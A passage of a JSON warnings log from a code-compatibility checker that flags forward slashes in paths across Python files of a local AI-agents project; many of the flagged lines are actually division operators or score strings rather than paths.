        "warning": "Line 539: Forward slash in path - ', []))\n            \n            if 1 <= classes <= 5 and functions <= classes * 8:  # Reasonable ratios\n                organized_components += 1\n        \n        if self.components:\n            organization_ratio = organized_components / len(self.components)\n            score += organization_ratio * 30\n        \n        return min(100, score)\n    \n    def _find_cycle_from_node(self, start_node: str, graph: Dict[str, List[str]], \n                            visited: Set[str], path: List[str]) -> Optional[List[str]]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.190252"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\system_architect.py",
        "warning": "Line 588: Forward slash in path - \"10. Standardize async/await patterns\"",
        "timestamp": "2025-09-05T17:30:42.190286"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\system_architect.py",
        "warning": "Line 652: Forward slash in path - \"Architecture Score: {report.architecture_score:.1f}/100\"",
        "timestamp": "2025-09-05T17:30:42.190356"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\system_architect.py",
        "warning": "Line 655: Forward slash in path - \"  Modularity Score: {report.modularity_score:.1f}/100\"",
        "timestamp": "2025-09-05T17:30:42.190381"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\system_architect.py",
        "warning": "Line 656: Forward slash in path - \"  Coupling Score: {report.coupling_score:.1f}/100\"",
        "timestamp": "2025-09-05T17:30:42.190399"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\system_architect.py",
        "warning": "Line 657: Forward slash in path - \"  Cohesion Score: {report.cohesion_score:.1f}/100\"",
        "timestamp": "2025-09-05T17:30:42.190416"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\system_architect.py",
        "warning": "Line 717: Forward slash in path - \"Overall Architecture Score: {report.architecture_score:.1f}/100\"",
        "timestamp": "2025-09-05T17:30:42.190476"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\verify_setup.py",
        "warning": "Line 20: Forward slash in path - \"backend/visualization_server.py\"",
        "timestamp": "2025-09-05T17:30:42.190788"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\verify_setup.py",
        "warning": "Line 21: Forward slash in path - \"backend/requirements.txt\"",
        "timestamp": "2025-09-05T17:30:42.190798"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\verify_setup.py",
        "warning": "Line 24: Forward slash in path - \"visualization/package.json\"",
        "timestamp": "2025-09-05T17:30:42.190804"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\verify_setup.py",
        "warning": "Line 25: Forward slash in path - \"visualization/vite.config.ts\"",
        "timestamp": "2025-09-05T17:30:42.190810"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\verify_setup.py",
        "warning": "Line 26: Forward slash in path - \"visualization/tsconfig.json\"",
        "timestamp": "2025-09-05T17:30:42.190817"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\verify_setup.py",
        "warning": "Line 27: Forward slash in path - \"visualization/index.html\"",
        "timestamp": "2025-09-05T17:30:42.190823"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\verify_setup.py",
        "warning": "Line 28: Forward slash in path - \"visualization/src/main.tsx\"",
        "timestamp": "2025-09-05T17:30:42.190828"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\verify_setup.py",
        "warning": "Line 29: Forward slash in path - \"visualization/src/App.tsx\"",
        "timestamp": "2025-09-05T17:30:42.190832"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\verify_setup.py",
        "warning": "Line 30: Forward slash in path - \"visualization/src/index.css\"",
        "timestamp": "2025-09-05T17:30:42.190836"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\verify_setup.py",
        "warning": "Line 33: Forward slash in path - \"visualization/src/components/NetworkVisualization3D.tsx\"",
        "timestamp": "2025-09-05T17:30:42.190840"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\verify_setup.py",
        "warning": "Line 34: Forward slash in path - \"visualization/src/components/PerformanceDashboard.tsx\"",
        "timestamp": "2025-09-05T17:30:42.190845"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\verify_setup.py",
        "warning": "Line 35: Forward slash in path - \"visualization/src/components/TradingFloorSimulation.tsx\"",
        "timestamp": "2025-09-05T17:30:42.190849"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\verify_setup.py",
        "warning": "Line 38: Forward slash in path - \"visualization/src/types/index.ts\"",
        "timestamp": "2025-09-05T17:30:42.190854"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\verify_setup.py",
        "warning": "Line 39: Forward slash in path - \"visualization/src/hooks/useWebSocket.ts\"",
        "timestamp": "2025-09-05T17:30:42.190858"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\verify_setup.py",
        "warning": "Line 42: Forward slash in path - \"data/synthetic_data_generator.py\"",
        "timestamp": "2025-09-05T17:30:42.190863"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\verify_setup.py",
        "warning": "Line 45: Forward slash in path - \"docs/ADVANCED_VISUALIZATION_SYSTEM.md\"",
        "timestamp": "2025-09-05T17:30:42.190867"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\verify_setup.py",
        "warning": "Line 49: Forward slash in path - \"scripts/start_visualization_demo.py\"",
        "timestamp": "2025-09-05T17:30:42.190873"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\verify_setup.py",
        "warning": "Line 50: Forward slash in path - \"scripts/verify_setup.py\"",
        "timestamp": "2025-09-05T17:30:42.190879"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\verify_setup.py",
        "warning": "Line 72: Forward slash in path - \")\n    \n    project_root = Path(__file__).parent.parent\n    \n    # Check visualization package.json\n    viz_package_json = project_root / \"",
        "timestamp": "2025-09-05T17:30:42.190891"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\verify_setup.py",
        "warning": "Line 77: Forward slash in path - \" / \"",
        "timestamp": "2025-09-05T17:30:42.190896"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\verify_setup.py",
        "warning": "Line 84: Forward slash in path - \"@react-three/fiber\"",
        "timestamp": "2025-09-05T17:30:42.190906"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\verify_setup.py",
        "warning": "Line 85: Forward slash in path - \"@react-three/drei\"",
        "timestamp": "2025-09-05T17:30:42.190914"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\verify_setup.py",
        "warning": "Line 98: Forward slash in path - \")\n            return False\n    \n    # Check backend requirements.txt\n    backend_requirements = project_root / \"",
        "timestamp": "2025-09-05T17:30:42.190937"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\verify_setup.py",
        "warning": "Line 102: Forward slash in path - \" / \"",
        "timestamp": "2025-09-05T17:30:42.190943"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\verify_setup.py",
        "warning": "Line 135: Forward slash in path - \"  backend/                     # FastAPI server with WebSocket streaming\"",
        "timestamp": "2025-09-05T17:30:42.190970"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\verify_setup.py",
        "warning": "Line 139: Forward slash in path - \"  visualization/               # React frontend with 3D graphics\"",
        "timestamp": "2025-09-05T17:30:42.190982"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\verify_setup.py",
        "warning": "Line 140: Forward slash in path - \"    src/components/            # Visualization components\"",
        "timestamp": "2025-09-05T17:30:42.190988"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\verify_setup.py",
        "warning": "Line 144: Forward slash in path - \"    src/hooks/useWebSocket.ts       # Real-time data connection\"",
        "timestamp": "2025-09-05T17:30:42.190998"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\verify_setup.py",
        "warning": "Line 145: Forward slash in path - \"    src/types/index.ts              # TypeScript definitions\"",
        "timestamp": "2025-09-05T17:30:42.191004"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\verify_setup.py",
        "warning": "Line 147: Forward slash in path - \"  data/                        # Data generation and processing\"",
        "timestamp": "2025-09-05T17:30:42.191011"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\verify_setup.py",
        "warning": "Line 150: Forward slash in path - \"  scripts/                     # Automation and demo tools\"",
        "timestamp": "2025-09-05T17:30:42.191018"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\verify_setup.py",
        "warning": "Line 154: Forward slash in path - \"  docs/                        # Comprehensive documentation\"",
        "timestamp": "2025-09-05T17:30:42.191028"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\templates\\base_agent.py",
        "warning": "Line 125: Forward slash in path - '] = successes / len(self.episodic_memory)\n            \n            # Extract common learnings\n            all_learnings = []\n            for obs in self.episodic_memory:\n                all_learnings.extend(obs.learnings)\n            patterns['",
        "timestamp": "2025-09-05T17:30:42.191439"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\templates\\base_agent.py",
        "warning": "Line 359: Forward slash in path - \"\n        if not past_experiences:\n            return 0.5\n        \n        successes = sum(1 for exp in past_experiences if exp.success)\n        return successes / len(past_experiences)\n    \n    def _select_tools_for_strategy(self, strategy: str) -> List[Callable]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.191665"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\templates\\base_agent.py",
        "warning": "Line 413: Forward slash in path - \"\n        if self.total_tasks == 0:\n            return 0.0\n        return self.successful_tasks / self.total_tasks\n    \n    def get_metrics(self) -> Dict[str, Any]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.191727"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\templates\\phase7_enhanced_tot.py",
        "warning": "Line 104: Forward slash in path - \"\n        # Mock implementation - would use semantic similarity\n        problem_keywords = set(problem.lower().split())\n        thought_keywords = set(thought.content.lower().split())\n        \n        keyword_overlap = len(problem_keywords.intersection(thought_keywords))\n        relevance = min(1.0, keyword_overlap / max(1, len(problem_keywords) * 0.3))\n        \n        return relevance\n    \n    async def _assess_thought_novelty(self, thought: Thought) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.192376"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\templates\\phase7_enhanced_tot.py",
        "warning": "Line 150: Forward slash in path - ']\n        \n        content_lower = thought.content.lower()\n        completeness_count = sum(1 for indicator in completeness_indicators if indicator in content_lower)\n        \n        # Length as proxy for detail\n        length_factor = min(1.0, len(thought.content) / 200.0)\n        \n        completeness = min(1.0, (completeness_count * 0.3) + (length_factor * 0.7))\n        return completeness\n    \n    def _assess_depth_appropriateness(self, thought: Thought, depth: int) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.192420"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\templates\\phase7_enhanced_tot.py",
        "warning": "Line 162: Forward slash in path - \"\n        # Expect more detailed thoughts at greater depths\n        expected_detail = depth * 0.1 + 0.3\n        actual_detail = min(1.0, len(thought.content) / 150.0)\n        \n        depth_appropriateness = 1.0 - abs(expected_detail - actual_detail)\n        return max(0.1, depth_appropriateness)\n    \n    async def _calculate_thought_similarity(self, thought1: Thought, thought2: Thought) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.192442"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\templates\\phase7_enhanced_tot.py",
        "warning": "Line 171: Forward slash in path - \"\n        # Simple word overlap similarity\n        words1 = set(thought1.content.lower().split())\n        words2 = set(thought2.content.lower().split())\n        \n        if not words1 and not words2:\n            return 1.0\n        if not words1 or not words2:\n            return 0.0\n        \n        intersection = len(words1.intersection(words2))\n        union = len(words1.union(words2))\n        \n        similarity = intersection / union if union > 0 else 0.0\n        return similarity\n\n\nclass EnhancedTreeOfThoughts:\n    \"",
        "timestamp": "2025-09-05T17:30:42.192460"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\templates\\phase7_enhanced_tot.py",
        "warning": "Line 420: Forward slash in path - \"\n        \n        if not thoughts:\n            return thoughts\n        \n        # Always keep at least one thought per level\n        sorted_thoughts = sorted(thoughts, key=lambda t: t.quality_score, reverse=True)\n        min_keep = max(1, len(thoughts) // 3)  # Keep at least 1/3\n        \n        high_quality = [t for t in sorted_thoughts if t.quality_score >= threshold]\n        \n        if len(high_quality) < min_keep:\n            return sorted_thoughts[:min_keep]\n        else:\n            return high_quality\n    \n    def select_best_solution(self, solution_candidates: List[Thought]) -> Thought:\n        \"",
        "timestamp": "2025-09-05T17:30:42.192635"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\templates\\phase7_enhanced_tot.py",
        "warning": "Line 451: Forward slash in path - \"\n        \n        # Trace back from solution to root\n        path_thoughts = []\n        current_thought = solution_thought\n        \n        while current_thought:\n            path_thoughts.append(current_thought)\n            parent_id = current_thought.parent_id\n            current_thought = self.thought_tree.get(parent_id) if parent_id else None\n        \n        path_thoughts.reverse()  # Root to solution order\n        \n        # Calculate path metrics\n        total_quality = sum(t.quality_score for t in path_thoughts) / len(path_thoughts)\n        confidence = solution_thought.confidence\n        solution_quality = solution_thought.quality_score\n        \n        # Generate reasoning trace\n        reasoning_trace = self._generate_reasoning_trace(path_thoughts)\n        \n        return ReasoningPath(\n            thoughts=path_thoughts,\n            total_quality=total_quality,\n            confidence=confidence,\n            reasoning_trace=reasoning_trace,\n            solution_quality=solution_quality\n        )\n    \n    def _generate_reasoning_trace(self, thoughts: List[Thought]) -> str:\n        \"",
        "timestamp": "2025-09-05T17:30:42.192684"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\templates\\phase7_working_memory.py",
        "warning": "Line 55: Forward slash in path - \"\n        if current_time is None:\n            current_time = datetime.now()\n        \n        # Recency factor (exponential decay)\n        time_diff = (current_time - self.last_accessed).total_seconds() / 3600  # hours\n        recency_score = np.exp(-self.decay_rate * time_diff)\n        \n        # Importance factor\n        importance_score = self.importance.value / 4.0\n        \n        # Access frequency factor\n        frequency_score = min(1.0, self.access_count / 10.0)\n        \n        # Consolidation factor\n        consolidation_factor = min(1.0, self.consolidation_score)\n        \n        relevance = (\n            recency_score * 0.3 +\n            importance_score * 0.3 +\n            frequency_score * 0.2 +\n            consolidation_factor * 0.2\n        )\n        \n        return relevance\n\n\n@dataclass\nclass MemoryQuery:\n    \"",
        "timestamp": "2025-09-05T17:30:42.193140"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\templates\\phase7_working_memory.py",
        "warning": "Line 389: Forward slash in path - '] = total_memories\n        \n        # Connection density\n        if total_memories > 0:\n            total_connections = sum(len(connections) for connections in self.connection_network.values())\n            max_connections = total_memories * (total_memories - 1) / 2\n            stats['",
        "timestamp": "2025-09-05T17:30:42.193338"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\templates\\phase7_working_memory.py",
        "warning": "Line 395: Forward slash in path - '] = total_connections / max_connections if max_connections > 0 else 0.0\n        \n        # Working memory utilization\n        working_count = len(self.memory_stores[MemoryType.WORKING])\n        stats['",
        "timestamp": "2025-09-05T17:30:42.193355"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\templates\\phase7_working_memory.py",
        "warning": "Line 399: Forward slash in path - '] = working_count / self.working_memory_capacity\n        \n        # Consolidation rate\n        if self.access_statistics['",
        "timestamp": "2025-09-05T17:30:42.193368"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\templates\\phase7_working_memory.py",
        "warning": "Line 403: Forward slash in path - '] / self.access_statistics['",
        "timestamp": "2025-09-05T17:30:42.193383"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\templates\\phase7_working_memory.py",
        "warning": "Line 417: Forward slash in path - \"\n        if embedding2 is None:\n            return 0.0\n        \n        # Cosine similarity\n        vec1 = np.array(embedding1)\n        vec2 = np.array(embedding2)\n        \n        dot_product = np.dot(vec1, vec2)\n        norms = np.linalg.norm(vec1) * np.linalg.norm(vec2)\n        \n        if norms == 0:\n            return 0.0\n        \n        similarity = dot_product / norms\n        return max(0.0, similarity)  # Ensure non-negative\n    \n    def _calculate_context_similarity(self, context1: Dict[str, Any], \n                                    context2: Dict[str, Any]) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.193422"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\templates\\phase7_working_memory.py",
        "warning": "Line 436: Forward slash in path - \"\n        if not context1 or not context2:\n            return 0.0\n        \n        common_keys = set(context1.keys()) & set(context2.keys())\n        if not common_keys:\n            return 0.0\n        \n        matches = 0\n        for key in common_keys:\n            if str(context1[key]) == str(context2[key]):\n                matches += 1\n        \n        similarity = matches / len(common_keys)\n        return similarity\n    \n    async def _create_memory_connections(self, new_memory: MemoryNode) -> None:\n        \"",
        "timestamp": "2025-09-05T17:30:42.193453"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\templates\\phase7_working_memory.py",
        "warning": "Line 453: Forward slash in path - \"\n        \n        # Find related memories across all stores\n        related_memories = []\n        \n        for memory_type, store in self.memory_stores.items():\n            for existing_memory in store.values():\n                if existing_memory.id == new_memory.id:\n                    continue\n                \n                # Calculate relatedness\n                semantic_similarity = await self._calculate_semantic_similarity(\n                    new_memory.embedding, existing_memory.embedding\n                )\n                \n                context_similarity = self._calculate_context_similarity(\n                    new_memory.context, existing_memory.context\n                )\n                \n                tag_overlap = len(new_memory.tags & existing_memory.tags) / max(1, len(new_memory.tags | existing_memory.tags))\n                \n                # Combined relatedness score\n                relatedness = (semantic_similarity * 0.5 + context_similarity * 0.3 + tag_overlap * 0.2)\n                \n                if relatedness > 0.3:  # Threshold for creating connection\n                    related_memories.append((existing_memory.id, relatedness))\n        \n        # Create bidirectional connections\n        for related_id, strength in related_memories[:10]:  # Limit connections\n            self.connection_network[new_memory.id][related_id] = strength\n            if related_id in self.connection_network:\n                self.connection_network[related_id][new_memory.id] = strength\n    \n    async def _manage_working_memory_capacity(self) -> None:\n        \"",
        "timestamp": "2025-09-05T17:30:42.193604"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\templates\\phase7_working_memory.py",
        "warning": "Line 512: Forward slash in path - \"\n        \n        # Factors influencing consolidation\n        access_factor = min(1.0, memory_node.access_count / 5.0)  # Frequently accessed\n        importance_factor = memory_node.importance.value / 4.0\n        connection_strength = len(self.connection_network.get(memory_node.id, {})) / 10.0\n        age_factor = min(1.0, (datetime.now() - memory_node.created_at).total_seconds() / 86400)  # Age in days\n        \n        consolidation_score = (\n            access_factor * 0.3 +\n            importance_factor * 0.4 +\n            connection_strength * 0.2 +\n            age_factor * 0.1\n        )\n        \n        return consolidation_score\n    \n    async def _strengthen_memory_connections(self, memory_node: MemoryNode) -> None:\n        \"",
        "timestamp": "2025-09-05T17:30:42.193702"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\conftest.py",
        "warning": "Line 168: Forward slash in path - \"sqlite+aiosqlite:///:memory:\"",
        "timestamp": "2025-09-05T17:30:42.194824"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\conftest.py",
        "warning": "Line 267: Forward slash in path - \"application/json\"",
        "timestamp": "2025-09-05T17:30:42.194953"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\conftest.py",
        "warning": "Line 304: Forward slash in path - \"sqlite+aiosqlite:///:memory:\"",
        "timestamp": "2025-09-05T17:30:42.194999"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\run_comprehensive_tests.py",
        "warning": "Line 21: Forward slash in path - \"\n    \n    def __init__(self):\n        self.project_root = project_root\n        self.test_dir = self.project_root / \"",
        "timestamp": "2025-09-05T17:30:42.195667"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\run_comprehensive_tests.py",
        "warning": "Line 25: Forward slash in path - \"\n        self.reports_dir = self.project_root / \"",
        "timestamp": "2025-09-05T17:30:42.195686"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\run_comprehensive_tests.py",
        "warning": "Line 83: Forward slash in path - \"tests/python/test_base_agent_comprehensive.py\"",
        "timestamp": "2025-09-05T17:30:42.195749"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\run_comprehensive_tests.py",
        "warning": "Line 93: Forward slash in path - \"tests/python/test_orchestrator_comprehensive.py\"",
        "timestamp": "2025-09-05T17:30:42.195767"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\run_comprehensive_tests.py",
        "warning": "Line 103: Forward slash in path - \"tests/python/test_utils_comprehensive.py\"",
        "timestamp": "2025-09-05T17:30:42.195786"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\run_comprehensive_tests.py",
        "warning": "Line 114: Forward slash in path - \"tests/python/test_base_agent.py\"",
        "timestamp": "2025-09-05T17:30:42.195803"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\run_comprehensive_tests.py",
        "warning": "Line 120: Forward slash in path - \"tests/python/test_orchestrator.py\"",
        "timestamp": "2025-09-05T17:30:42.195817"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\run_comprehensive_tests.py",
        "warning": "Line 140: Forward slash in path - \"--cov-report=html:test_reports/htmlcov\"",
        "timestamp": "2025-09-05T17:30:42.195845"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\run_comprehensive_tests.py",
        "warning": "Line 141: Forward slash in path - \"--cov-report=json:test_reports/coverage.json\"",
        "timestamp": "2025-09-05T17:30:42.195858"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\run_comprehensive_tests.py",
        "warning": "Line 143: Forward slash in path - \"tests/python/\"",
        "timestamp": "2025-09-05T17:30:42.195871"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\run_comprehensive_tests.py",
        "warning": "Line 144: Forward slash in path - \"\n            ]\n            \n            result = subprocess.run(\n                cmd, \n                cwd=self.project_root,\n                capture_output=True,\n                text=True,\n                timeout=300\n            )\n            \n            # Parse coverage results\n            coverage_file = self.reports_dir / \"",
        "timestamp": "2025-09-05T17:30:42.195891"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\run_comprehensive_tests.py",
        "warning": "Line 197: Forward slash in path - \"tests/python/\"",
        "timestamp": "2025-09-05T17:30:42.195959"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\run_comprehensive_tests.py",
        "warning": "Line 257: Forward slash in path - \"\n        \n        integration_file = self.test_dir / \"",
        "timestamp": "2025-09-05T17:30:42.196013"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\run_comprehensive_tests.py",
        "warning": "Line 298: Forward slash in path - \"--junitxml=test_reports/{test_name.lower().replace('",
        "timestamp": "2025-09-05T17:30:42.196057"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\run_comprehensive_tests.py",
        "warning": "Line 410: Forward slash in path - \": (successful_suites / total_suites * 100) if total_suites > 0 else 0,\n            \"",
        "timestamp": "2025-09-05T17:30:42.196168"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\run_comprehensive_tests.py",
        "warning": "Line 416: Forward slash in path - \": (total_passed / (total_passed + total_failed) * 100) if (total_passed + total_failed) > 0 else 0,\n            \"",
        "timestamp": "2025-09-05T17:30:42.196199"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\run_comprehensive_tests.py",
        "warning": "Line 423: Forward slash in path - \"\n        results_file = self.reports_dir / \"",
        "timestamp": "2025-09-05T17:30:42.196230"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\run_comprehensive_tests.py",
        "warning": "Line 467: Forward slash in path - \"   {suite_name}: {status} ({passed}/{total} tests)\"",
        "timestamp": "2025-09-05T17:30:42.196292"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_automation_runner.py",
        "warning": "Line 1: Forward slash in path - \"\nPhase 6 Test Automation Runner\n=============================\n\nComprehensive test automation system for Phase 6 AI agents including:\n- Automated test discovery and execution\n- Test result aggregation and reporting\n- CI/CD pipeline integration\n- Performance benchmarking\n- Coverage analysis\n- Quality gates enforcement\n- Test environment management\n- Parallel test execution\n- Failure analysis and reporting\n\"",
        "timestamp": "2025-09-05T17:30:42.197824"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_automation_runner.py",
        "warning": "Line 115: Forward slash in path - \"tests/unit\"",
        "timestamp": "2025-09-05T17:30:42.197882"
      },
      {
        "category": "WINDOWS_COMPAT",
